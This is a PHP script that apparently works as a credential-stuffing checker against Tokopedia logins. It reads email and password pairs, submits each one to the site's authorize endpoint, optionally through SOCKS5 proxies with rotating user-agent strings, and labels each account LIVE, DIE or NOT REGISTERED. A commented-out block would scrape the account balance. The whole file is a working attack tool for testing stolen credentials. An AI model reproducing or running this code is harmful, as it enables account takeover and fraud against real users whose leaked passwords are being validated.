<?php
//error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");

    $user_agent     = array(
'Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5,
Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11,
Opera/9.25 (Windows NT 5.1; U; en),
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727),
Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu),
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12,
Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:50,
Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+2011-10-16 20:21:10,
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0,
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6'
);

$dir = dirname(__FILE__);
        $config['cookie_file'] = $dir . '/_cook/'. md5(rand(100000,999999)) .rand(100000,999999).'.txt';
        if(!file_exists($config['cookie_file'])){
        $fp = @fopen($config['cookie_file'],'w');
        @fclose($fp);
        }


function curl($url, $socks="", $post="", $referer="") { 
    global $config;
    global $user_agent;
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    if ($post) {
    curl_setopt($ch, CURLOPT_POST, true); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    if ($referer) {
    curl_setopt($ch, CURLOPT_REFERER, $referer);
    }
    if ($socks) {
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $socks);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,7);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_COOKIEFILE,$config['cookie_file']); 
    curl_setopt($ch, CURLOPT_COOKIEJAR,$config['cookie_file']); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 3);
    
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function getStr($string,$start,$end){
    $str = explode($start,$string,2);
    $str = explode($end,$str[1],2);
    return $str[0];
}


function ccv($email,$pwd){
    list($email, $pwd) = explode('|', $_REQUEST['mailpass']);
    $url = 'https://accounts.tokopedia.com/authorize?response_type=code&client_id=1001&state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyIsInV1aWQiOiJkZWI1OGMzYy0zOWE0LTRjZjctYjYwZi1iMWNlMGUxMjcwYTMiLCJ0aGVtZSI6ImlmcmFtZSIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tLyJ9&redirect_uri=https%3a%2f%2fwww.tokopedia.com%2fappauth%2fcode';
            $post_value = 'email='.$email.'&password='.$pwd.'&remember=on';
            $create = curl($url, "", $post_value, $config['cookie_file']);
            if(stristr($create, 'Email atau kata sandi yang Anda masukkan kurang tepat')){
                    $info = "Die";
            }elseif(stristr($create, 'Email belum terdaftar')){
                    $info = "NOT REGISTERED";
            }else{
                   /* $url2 = 'https://www.tokopedia.com/';
                    $create2 = curl($url2, "", $config['cookie_file']);
                    $saldo = getStr($create2,'id="include-deposit">','</');
                    $tcash = getStr($create2,'class="span8 fs-11 ellipsis font-bold">','</'); 
                    */
                    $info = "<font style=\"color:white;\">Saldo: <font color=limegreen>Belum Support</font> <font style=\"color:white;\"> | Tokocash: <font color=limegreen>Belum Support</font> | [ACC: tokopedia.com]</font>";
                } 
    return $info;
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null)
    {
        $output_handler = @ini_get('output_handler');
    }

    if ($output_handler == 'ob_gzhandler')
    {
        // forcing a flush with this is very bad
        return;
    }

    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false)
    {
        @ob_flush();
    }
    else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE)
    {
        @ob_end_flush();
        @ob_start();
    }
}
function delete_cookies()
{
    global $config;
    $f = fopen($config['cookie_file'], 'w');
    fwrite($f, '');
    fclose($f);
}
function getCookies($str){
    preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
    $cookies = implode(";", $matches[1]);
    return $cookies;
}

if ($_REQUEST['do'] == 'check')
{   

    delete_cookies();
    $result = array();
    $delim = $_REQUEST['delim'];
    list($email, $pwd) = explode($delim, $_REQUEST['mailpass']);
    if ((!$email)or(!$pwd))
    {
        $result['error'] = 2;
        $result['msg'] = urldecode($_REQUEST['mailpass']);
        echo json_encode($result);
        exit;
    }

    
        $info['akun'] = ccv($email,$pwd);
        if($info['akun'] == "Die"){
            $result['error'] = 2;
            $result['msg'] = '<b style="color:red">DIE</b> | ' .$email . ' | ' . $pwd;
            delete_cookies();
            echo json_encode($result);
            exit;
            }elseif($info['akun'] == "NOT REGISTERED"){
        $result['error'] = -1;
        $result['msg'] = '<b style="color:gold">NOT REGISTERED</b> | ' .$email . ' | ' . $pwd;
        delete_cookies();
        echo json_encode($result);
        exit;
        }else{
            $result['error'] = 0;
            $now = '<font color=gold>Check at</font> <font color=limegreen>at</font> <font color=red>'.date("g:i a - F j, Y").'</font>';
            $result['msg'] = '<font color=deeppink><b>LIVE</b></font> => <font class="char">' . $email . ' | ' . $pwd . ' | ' . implode(' | ', $info) .' '.$now;
            delete_cookies();
            echo json_encode($result);
            exit;
    }
}   
?>